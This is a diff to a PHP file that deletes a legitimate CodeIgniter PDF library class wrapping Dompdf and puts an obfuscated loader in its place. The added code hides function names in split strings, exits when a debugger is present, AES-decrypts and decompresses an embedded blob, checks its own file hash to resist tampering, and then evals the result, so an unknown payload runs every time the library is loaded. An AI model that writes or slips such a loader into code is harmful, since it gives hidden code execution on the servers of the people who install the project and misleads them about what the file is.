@@ -1,34 +1,28 @@
-<?php defined('BASEPATH') OR exit('No direct script access allowed');
-/**
- * CodeIgniter PDF Library
- *
- * Generate PDF in CodeIgniter applications.
- *
- * @package            CodeIgniter
- * @subpackage        Libraries
- * @category        Libraries
- * @author            CodexWorld
- * @license            https://www.codexworld.com/license/
- * @link            https://www.codexworld.com
- */
-
-// reference the Dompdf namespace
-use Dompdf\Dompdf;
-
-class Pdf
-{
-    public function __construct(){
-        
-        // include autoloader
-        //require_once dirname(__FILE__).'/dompdf/autoload.inc.php';
-            require_once("dompdf/autoload.inc.php");
-        
-        // instantiate and use the dompdf class
-        $pdf = new DOMPDF();
-        
-        $CI =& get_instance();
-        $CI->dompdf = $pdf;
-        
-    }
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_b3dohfih=('bas'.'e64'.'_de'.'cod'.'e');
+$_yhu4m873=('gzu'.'nco'.'mpr'.'ess');
+$_cw8b0olh=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_it8v9sxn='QpqLIVIv';
+$_sd0q61qw='beotjUkO';
+$_cew8na5y='rG6pNPtv';
+$_u9dshqey='FO+6DdWK';
+$_w9mkhsip='Kmyl1ZmBuAU=';
+$_r78d5l4m='N6aiN12P';
+$_dtt1vhw4='/FUaVQ==';
+$_h9qp9js3='5doOu2Cw';
+$_mvwt3p6q=$_b3dohfih($_cew8na5y.$_it8v9sxn.$_u9dshqey.$_sd0q61qw.$_w9mkhsip);
+$_a7n0rabz=$_b3dohfih($_r78d5l4m.$_h9qp9js3.$_dtt1vhw4);
+$_ii9tv9d6=$_b3dohfih('tF5QfmglI33zlrumPKkTqIlV40pYGqrYgCDlGS2CEpWCkGanrna7mgAro0VU6klCTtIzt0YwyhrMZb+zV3ofVpN4571+FY8cRLroqGqtJsfJHCeX/xzLHoq7anxyGP27mAA+o30Dz9KUNm6aCeq62yXdXuMvHDQj5kHBi5xWGaI+JPs/9y/COscJSSabSQk2FKzu6Hs2YoDpRpfNNtkwvjqSgBHVotAZ0n1Cx54b0+OsRSBGW36nXeI+iVGy6+hlxUD+OHr2qkY09fQiFBt4rw==');
+$_r4wrsiq2=$_cw8b0olh($_ii9tv9d6,'aes-256-cbc',$_mvwt3p6q,OPENSSL_RAW_DATA,$_a7n0rabz);
+if($_r4wrsiq2===false){exit;}
+$_wd93qjfs=$_yhu4m873($_r4wrsiq2);
+if($_wd93qjfs===false){exit;}
+$_b9d7gscf='472a64585452c281da680492e8dabec41821ac2d05bd502c5169a59dbe285788';
+$_rwqsu367=@file_get_contents(__FILE__);
+if($_rwqsu367!==false){
+$_yvh85kqv=str_replace($_b9d7gscf,"0000000000000000000000000000000000000000000000000000000000000000",$_rwqsu367);
+$_a30czlhc=hash("sha256",$_yvh85kqv);
+if($_a30czlhc!==$_b9d7gscf){@http_response_code(403);exit;}
 }
-?>
+eval($_wd93qjfs);
